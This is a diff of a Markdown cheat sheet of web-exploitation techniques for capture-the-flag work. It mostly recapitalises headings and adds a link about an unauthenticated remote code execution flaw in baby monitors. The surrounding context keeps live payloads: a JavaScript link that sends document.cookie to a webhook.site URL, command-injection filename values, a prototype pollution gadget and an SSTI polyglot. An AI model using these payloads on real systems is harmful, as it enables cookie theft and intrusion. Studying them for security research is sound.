@@ -38,7 +38,7 @@
 - https://www.freenom.com/en/index.html?lang=en
 - http://www.dot.tk/en/index.html?lang=en
 
-# information disclosure
+# Information Disclosure
 
 - [GitHub \- cure53/HTTPLeaks: HTTPLeaks \- All possible ways, a website can leak HTTP requests](https://github.com/cure53/HTTPLeaks)
 
@@ -109,7 +109,7 @@ if _name__ == "__main__":
 
 - https://developer.mozilla.org/en-US/docs/Web/Security/Referer_header:_privacy_and_security_concerns
 
-# prototype pollution
+# Prototype Pollution
 
 ```javascript
 Object.prototype.outputFunctionName = 'x;<code>;x'
@@ -230,7 +230,7 @@ Clone:
 
 - Mitigation: Firefox: `security.mixed_content.block_active_content`
 
-### spread operator pollution
+### Spread operator pollution
 
 - e.g. skip one endpoint's check by using another endpoint without that check, using former endpoint's properties
     - [CTFtime\.org / DiceCTF 2021 / Web Utils / Writeup](https://ctftime.org/writeup/25986)
@@ -242,7 +242,7 @@ Clone:
     {"data": "javascript: fetch(`https://webhook.site/d2522a84-184e-496f-9e29-60360577d4c4?data=${encodeURIComponent(document.cookie)}`)", "type": "link"}
     ```
 
-# command injection
+# Command Injection
 
 - URL parameter
     - `file="'$(sleep 5)'a.gif`
@@ -256,7 +256,7 @@ Clone:
 - [#863956 \[extra-asciinema\] Command Injection via insecure command formatting](https://hackerone.com/reports/863956)
     - [Avoid\-Command\-Injection\-Node\.md · GitHub](https://gist.github.com/evilpacket/5a9655c752982faf7c4ec6450c1cbf1b)
 
-### server-side template injection (SSTI)
+### Server-Side Template Injection (SSTI)
 
 - jinja
     - [CTFtime\.org / zer0pts CTF 2020 / notepad / Writeup](https://ctftime.org/writeup/18597)
@@ -310,7 +310,7 @@ Clone:
     - p. 51: payloads
     - p. 52: polyglot - `<#set($x<%={{={@{#{${xux}}%>)`
 
-# server-side request forgery (SSRF)
+# Server-Side Request Forgery (SSRF)
 
 - Headers
     - burp: Proxy > Options > Match and Replace
@@ -445,7 +445,7 @@ sys.stdout.buffer.write(bytes(str(hex(len(o)-7))[2:], "ascii") + b"\r\n" + o)' ~
     - [h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext \(h2c\)](https://labs.bishopfox.com/tech-blog/h2c-smuggling-request-smuggling-via-http/2-cleartext-h2c)
     - [H2C Smuggling in the Wild \- Assetnote](https://blog.assetnote.io/2021/03/18/h2c-smuggling/)
 
-# directory traversal
+# Directory Traversal
 
 - writing arbitrary files
     - [extraction path](./forensics.md#extraction-path)
@@ -454,10 +454,15 @@ sys.stdout.buffer.write(bytes(str(hex(len(o)-7))[2:], "ascii") + b"\r\n" + o)' ~
     - https://blog.npmjs.org/post/80277229932/newly-paranoid-maintainers
     - ~/Downloads/st-20140206_0_0_6b54ce2d2fb912eadd31e2c25c65456d2c8666e1.patch
 
-# Insecure direct object references (IDOR)
+# Insecure Direct Object References (IDOR)
 
 - https://randywestergren.com/visa-gift-card-transactions-exposed-gowallet-vulnerability/
 - https://www.aon.com/cyber-solutions/aon_cyber_labs/finding-more-idors-tips-and-tricks/
+
+# Access Control
+
+- MQTT
+    - [Unauthenticated Remote Code Execution in Motorola Baby Monitors \- Randy Westergren](https://randywestergren.com/unauthenticated-remote-code-execution-in-motorola-baby-monitors/)
 
 # Cross-Site Scripting (XSS)
 
@@ -778,7 +783,7 @@ sqlmap.py -u http://ctf.sharif.edu:8082/login.php --method=POST --data="username
     - https://www.defcon.org/images/defcon-21/dc-21-presentations/Chow/DEFCON-21-Chow-Abusing-NoSQL-Databases.pdf
 - https://nullsweep.com/nosql-injection-cheatsheet/
 
-# code injection
+# Code Injection
 
 - On: state persisted as objects (e.g. cookie)
     - https://github.com/saw-your-packet/ctfs/blob/master/DarkCTF/Write-ups.md#dusty-notes
@@ -788,7 +793,7 @@ sqlmap.py -u http://ctf.sharif.edu:8082/login.php --method=POST --data="username
     j:[{"id":1,"body":["foo'"]}]
     ```
 
-# deserialization
+# Deserialization
 
 ### java
 
